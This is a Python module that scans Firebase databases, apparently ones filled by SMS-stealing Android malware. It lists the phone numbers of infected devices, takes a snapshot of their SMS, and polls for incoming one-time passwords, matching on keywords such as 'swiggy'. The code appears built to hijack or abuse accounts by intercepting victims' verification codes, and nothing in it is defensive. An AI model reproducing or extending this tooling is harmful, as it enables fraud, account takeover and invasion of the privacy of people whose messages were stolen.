"""
firebase.py — Firebase device discovery + SMS OTP watcher

Scanner logic ported from auto.py reference (Poonawalla bits stripped):
  - Checks clients/devices/users/Profiles/Accounts nodes
  - Falls back to All_Users/DeviceInfo.json + All_Users/simDetails.json
  - Online filter: status/online/isOnline = true/1/online/active
  - SMS baseline snapshot by key set before OTP send
  - Poll: new keys OR timestamp >= request_epoch - 10 and within 120s
  - OTP: generic [4-6 digit] near swiggy/otp keyword
"""

import asyncio
import logging
import re
import time
from typing import Any, Dict, List, Optional, Set, Tuple

import aiohttp

from config import (
    FB_TIMEOUT, ONLINE_FIELDS, ONLINE_TRUE,
    OTP_POLL_INTERVAL, OTP_TIMEOUT,
    SMS_SUBPATHS,
)

log = logging.getLogger("firebase")

PHONE_RE    = re.compile(r'(?:^|[^\d])([6-9]\d{9})(?:[^\d]|$)')
OTP_RE_6    = re.compile(r'\b(\d{6})\b')
OTP_RE_4_6  = re.compile(r'\b(\d{4,6})\b')
OTP_KEYWORDS = {"swiggy", "otp", "code", "verify", "verification",
                "one time", "password", "pin", "passcode"}
OTP_REJECT   = {"₹", "rs.", "amount", "price", "order", "delivery",
                "flipkart", "amazon", "paytm", "phonepe"}


# ── Low-level async fetch ─────────────────────────────────────────────────────

async def _get(sess: aiohttp.ClientSession, url: str) -> Optional[Any]:
    try:
        async with sess.get(url, timeout=aiohttp.ClientTimeout(total=FB_TIMEOUT)) as r:
            if r.status != 200:
                return None
            data = await r.json(content_type=None)
            return data if data and data != "null" else None
    except Exception:
        return None


# ── Phone normaliser (exact from reference) ───────────────────────────────────

def _clean_phone(raw) -> Optional[str]:
    if not raw:
        return None
    d = re.sub(r"\D", "", str(raw))
    if len(d) == 12 and d.startswith("91"):
        d = d[2:]
    elif len(d) == 11 and d.startswith("0"):
        d = d[1:]
    if len(d) > 10:
        d = d[-10:]
    return d if len(d) == 10 and d[0] in "6789" else None


def _is_online(info: dict) -> bool:
    for f in ONLINE_FIELDS:
        v = info.get(f)
        if v is None:
            continue
        if isinstance(v, bool):
            return v
        if isinstance(v, int):
            return v == 1
        if str(v).lower().strip() in ONLINE_TRUE:
            return True
    return False


def _phone_from_dict(info: dict) -> Optional[str]:
    """Check all common field names, then sim sub-dicts."""
    # direct fields
    for field in ("mobNo", "mob", "mobile", "phoneNumber", "phone", "number",
                  "sim1Number", "sim2Number", "numberSim1", "numberSim2"):
        p = _clean_phone(info.get(field))
        if p:
            return p
    # sims list
    sims = info.get("sims", [])
    if isinstance(sims, dict):
        sims = list(sims.values())
    for sim in (sims if isinstance(sims, list) else [])[:2]:
        if isinstance(sim, dict):
            for f in ("phoneNumber", "phone", "number", "mobNo",
                      "sim1Number", "sim2Number"):
                p = _clean_phone(sim.get(f))
                if p:
                    return p
    return None


# ── OTP extractor ─────────────────────────────────────────────────────────────

def extract_otp(body: str) -> Optional[str]:
    body_lo = body.lower()

    # reject non-OTP messages
    for kw in OTP_REJECT:
        if kw in body_lo:
            return None

    has_keyword = any(kw in body_lo for kw in OTP_KEYWORDS)

    # prefer 6-digit with keyword
    for m in OTP_RE_6.finditer(body):
        n = m.group(1)
        if 1900 <= int(n) <= 2099:
            continue
        if has_keyword:
            return n

    # 4-6 digit with keyword
    for m in OTP_RE_4_6.finditer(body):
        n = m.group(1)
        if 1900 <= int(n) <= 2099:
            continue
        if has_keyword:
            return n

    # last resort: any 6-digit standalone
    for m in OTP_RE_6.finditer(body):
        n = m.group(1)
        if 1900 <= int(n) <= 2099:
            continue
        return n

    return None


def _body_from_msg(msg: Any) -> str:
    if isinstance(msg, str):
        return msg
    if isinstance(msg, dict):
        return str(
            msg.get("body") or msg.get("text") or
            msg.get("message") or msg.get("msg") or
            msg.get("content") or
            " ".join(str(v) for v in msg.values() if isinstance(v, str))
        )
    return ""


def _msg_timestamp(msg: dict) -> Optional[float]:
    raw = msg.get("timestamp") or msg.get("time") or msg.get("date")
    if raw is None:
        return None
    try:
        t = float(raw)
        return t / 1000.0 if t > 1e12 else t
    except Exception:
        return None


# ── Firebase device scanner (ported from auto.py) ─────────────────────────────

async def _scan_standard_nodes(sess: aiohttp.ClientSession,
                                base: str) -> List[Dict]:
    """
    Try clients/devices/users/Profiles/Accounts nodes.
    Returns list of {phone, device_id} for online devices.
    """
    results: List[Dict] = []
    seen:    Set[str]   = set()

    for node in ("clients", "devices", "users", "Profiles", "Accounts",
                 "Clients", "Devices", "mobiles", "user_data"):
        data = await _get(sess, f"{base}/{node}.json")
        if not isinstance(data, dict) or not data:
            continue

        for dev_id, info in data.items():
            if not isinstance(info, dict):
                continue
            if not _is_online(info):
                continue
            phone = _phone_from_dict(info)
            if phone and phone not in seen:
                seen.add(phone)
                results.append({"phone": phone, "device_id": str(dev_id)})

        if results:
            log.info(f"Standard node /{node}: {len(results)} online devices")
            return results

    return results


async def _scan_all_users(sess: aiohttp.ClientSession,
                           base: str) -> List[Dict]:
    """
    Fallback: All_Users/DeviceInfo.json + All_Users/simDetails.json
    Mirrors auto.py reference exactly.
    """
    results: List[Dict] = []
    seen:    Set[str]   = set()

    for prefix in ("All_Users", "All_User"):
        dev_info = await _get(sess, f"{base}/{prefix}/DeviceInfo.json")
        if not isinstance(dev_info, dict):
            continue

        sim_data = await _get(sess, f"{base}/{prefix}/simDetails.json") or {}

        for dev_id, info in dev_info.items():
            if not isinstance(info, dict):
                continue
            sim = sim_data.get(dev_id, {}) if isinstance(sim_data, dict) else {}
            phone = None
            for field in ("sim1Number", "sim2Number", "phoneNumber",
                          "number", "phone", "mobile", "mobNo"):
                raw = (sim.get(field) if isinstance(sim, dict) else None) or info.get(field)
                phone = _clean_phone(raw)
                if phone:
                    break
            if phone and phone not in seen:
                seen.add(phone)
                results.append({"phone": phone, "device_id": str(dev_id)})

        if results:
            log.info(f"All_Users fallback ({prefix}): {len(results)} devices")
            return results

    return results


async def get_devices(firebase_url: str) -> List[Dict]:
    """
    Returns [{phone, device_id}, ...] from the Firebase URL.
    Priority: online devices from standard nodes → All_Users fallback → all devices (no online filter)
    """
    base = firebase_url.rstrip("/")

    async with aiohttp.ClientSession() as sess:
        # 1. standard nodes, online only
        results = await _scan_standard_nodes(sess, base)
        if results:
            log.info(f"get_devices: {len(results)} phones")
            return results

        # 2. All_Users fallback
        results = await _scan_all_users(sess, base)
        if results:
            log.info(f"get_devices: {len(results)} phones (All_Users)")
            return results

        # 3. standard nodes, NO online filter (all devices)
        log.warning("No online devices found — scanning all devices without online filter")
        seen: Set[str] = []
        seen_set: Set[str] = set()
        for node in ("clients", "devices", "users", "Clients", "Devices",
                     "mobiles", "user_data", "Profiles", "Accounts"):
            data = await _get(sess, f"{base}/{node}.json")
            if not isinstance(data, dict):
                continue
            for dev_id, info in data.items():
                if not isinstance(info, dict):
                    continue
                phone = _phone_from_dict(info)
                if phone and phone not in seen_set:
                    seen_set.add(phone)
                    seen.append({"phone": phone, "device_id": str(dev_id)})
            if seen:
                log.info(f"get_devices (no-filter): {len(seen)} from /{node}")
                return seen

    log.warning("get_devices: no phones found in this Firebase")
    return []


# ── SMS snapshot + OTP watcher ────────────────────────────────────────────────

async def _fetch_sms(sess: aiohttp.ClientSession,
                     base: str, device_id: str) -> Dict[str, Any]:
    """
    Fetch SMS messages for device_id across all known subpaths.
    Returns merged {msg_id: msg_data} dict.
    """
    base = base.rstrip("/")
    tasks = {
        sp: asyncio.create_task(_get(sess, f"{base}/{sp}/{device_id}.json"))
        for sp in SMS_SUBPATHS
    }
    merged: Dict[str, Any] = {}
    for sp, task in tasks.items():
        try:
            data = await task
        except Exception:
            continue
        if isinstance(data, dict) and data:
            merged.update(data)
            log.debug(f"SMS from {sp}/{device_id}: {len(data)} msgs")
    return merged


async def snapshot_sms(firebase_url: str, device_id: str) -> Tuple[Set[str], str]:
    """
    Snapshot current SMS key set BEFORE sending OTP.
    Returns (baseline_key_set, base_url_stripped).
    """
    base = firebase_url.rstrip("/")
    async with aiohttp.ClientSession() as sess:
        msgs = await _fetch_sms(sess, base, device_id)
    baseline = set(msgs.keys())
    log.info(f"SMS snapshot: device={device_id[:14]} keys={len(baseline)}")
    return baseline, base


async def wait_for_otp(
    firebase_url:   str,
    device_id:      str,
    baseline_keys:  Set[str],       # key set from snapshot_sms
    request_epoch:  float,          # time.monotonic() at OTP send
    timeout:        int = OTP_TIMEOUT,
    active_path:    Optional[str] = None,  # kept for API compat, unused
) -> Optional[str]:
    """
    Poll Firebase SMS every OTP_POLL_INTERVAL seconds for up to `timeout` seconds.

    A message is "new" if:
      - its key is NOT in baseline_keys, OR
      - it has a timestamp >= (request_epoch_wall - 10) and within 120s

    Returns OTP string or None on timeout.
    """
    base     = firebase_url.rstrip("/")
    deadline = time.monotonic() + timeout
    # convert monotonic epoch to wall time for timestamp comparison
    wall_epoch = time.time() - (time.monotonic() - request_epoch)

    connector = aiohttp.TCPConnector(limit=10, keepalive_timeout=15)
    async with aiohttp.ClientSession(connector=connector) as sess:
        while time.monotonic() < deadline:
            remaining = int(deadline - time.monotonic())
            log.debug(f"OTP watch: device={device_id[:14]} {remaining}s left")

            msgs = await _fetch_sms(sess, base, device_id)
            if msgs:
                for msg_id, msg in msgs.items():
                    if not isinstance(msg, (dict, str)):
                        continue

                    body = _body_from_msg(msg)
                    if not body:
                        continue

                    # determine if message is new
                    is_new_key = msg_id not in baseline_keys
                    ts         = _msg_timestamp(msg) if isinstance(msg, dict) else None
                    is_new_ts  = (
                        ts is not None and
                        ts >= (wall_epoch - 10) and
                        (time.time() - ts) <= 120
                    )

                    if not (is_new_key or is_new_ts):
                        continue

                    log.info(f"New SMS [{msg_id}] body: {body[:120]!r}")
                    otp = extract_otp(body)
                    if otp:
                        log.info(f"OTP={otp} device={device_id[:14]}")
                        return otp

            await asyncio.sleep(OTP_POLL_INTERVAL)

    log.warning(f"OTP timeout: device={device_id[:14]}")
    return None
